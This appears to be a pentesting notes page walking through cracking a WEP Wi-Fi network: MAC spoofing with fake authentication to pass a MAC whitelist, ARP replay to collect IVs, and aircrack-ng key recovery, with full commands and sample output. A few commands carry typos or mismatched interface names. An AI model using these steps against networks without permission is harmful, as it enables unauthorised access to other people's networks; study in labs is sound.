# WEP Attack \(OPEN\) - Clients connected

### 

### 1. Fake authentication attack \(MAC association\)

In a possible attack scenario, where an AP has MAC address filtering. We need to first obtain a valid mac address of a client, then wait until the client is no longer on the network and impersonate the client by performing fake authentication attack to associate our attacking machine with the victim access point.

**More Importantly**: This step may be required against targets that have mac whitelisting which the AP will only accept connections from specifically whitelisted MAC addresses. If this happens, we will need to observe in monitor mode for a client that is associated to the AP \(lower part screen of the airodump-ng output\) and wait for them to disconnect before impersonating their MAC address.

As usual begin all attacks with putting your adapter in monitor mode, mines on `wlan0`

```bash
airmon-ng check kill
airmon-ng start wlan0

# save capture file to disk - breaking it later (let it run)
aiodump-ng -c 3 --essid <SSID NAME> -w wepfile1 mon0

# perform fake authentication attack - on new terminal
# Authenticate my mac address to accesspoint (else traffic may be rejected)
#
# -1 fake auth attack
# 0 association timing in seconds
aireplay-ng -1 0 -e <AP_ESSID> -a <AP_MAC> -h <MY_MAC> mon0

# you should see this success
# 22:42:26  Sending Authentication Request (Open System) [ACK]
# 22:42:26  Authentication successful
# 22:42:26  Sending Association Request [ACK]
# 22:42:26  Association successful :-) (AID: 1)

```

You will see that your monitor MAC address is added \(lower screen of your airmon-ng screen\) showing that it is now associated with the target AP.

**Info:** iWireshark will show that there are 4 packets in this sequence of exchange. Protocol 802.11. 

* we send a "Open System" request \(Authentication Algorithm\) to AP 
* AP response with status code successful 
* we send a association request "SSID parameter set: AP\_ESSID\_NAME" 
* AP response with status code successful

### 2.  Collect IV data using ARP replay attack

Using the interactive aireplay attack we choose a specific packet to replay against target network to get a response \(eg. using ARP will make client respond the ARP response\) to generate enough IV so that we can successfully crack the WEP password

```bash
aireplay-ng -2 -e <ESSID> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 wlan0mon
# -f 1           to filter packets with "from DS" bit set (the values are 0 or 1) - why???
# -m 68 -n 86    minumum and maximum size of ARP packets 
# -d             Broadcast to all 

# No source MAC (-h) specified. Using the device MAC (98:3F:9F:19:06:49)
# 
# 
#         Size: 68, FromDS: 1, ToDS: 0 (WEP)
# 
#               BSSID  =  88:D7:F6:B8:EE:80
#          Dest. MAC  =  FF:FF:FF:FF:FF:FF
#          Source MAC  =  88:D7:F6:B8:EE:80
# 
#         0x0000:  0842 0000 ffff ffff ffff 88d7 f6b8 ee80  .B..............
#         0x0010:  88d7 f6b8 ee80 c03c dcf9 bb00 a0bb 7f65  .......<......e
#         0x0020:  d4a6 04d1 90c6 dbd8 92cc d7bf 743b 4577  ............t;Ew
#         0x0030:  82aa e7d7 4e22 9dff a3d8 0e0e a5f5 8911  ....N"..........
#         0x0040:  230a ee10                                #...
# 
# Use this packet ? y
```

**Info:** When a packet is captured, we can chose to use that packet to replay against the target to collect more IV \(more IV collected will help crack the WEP password\). You will see the 'data' field in your monitor count increasing rapidly, if not use other packets. About 40,000 data count collected should be enough to crack the WEP.

### 3. Cracking WEP

Now that we have enough IV collected \(in the written cap file\) we can easily crack it using

```bash
aircrack-ng -0 -z -n 64 clientwep-01.cap

# Reading packets, please wait...
# Opening clientwep-01.cap
# Read 282535 packets.
# 
#    #  BSSID              ESSID                     Encryption
# 
#    1  88:D7:F6:B8:EE:80  ABCDEF                     WEP (0 IVs)
# 
# Choosing first network as target.
# 
# Reading packets, please wait...
# Opening clientwep-01.cap
# Read 282535 packets.
# 
# 1 potential targets
# 
# Attack will be restarted every 5000 captured ivs.
# Starting PTW attack with 58681 ivs.
#                          KEY FOUND! [ 12:34:56:78:9A ] 
# 	Decrypted correctly: 100%

```

### 

### 

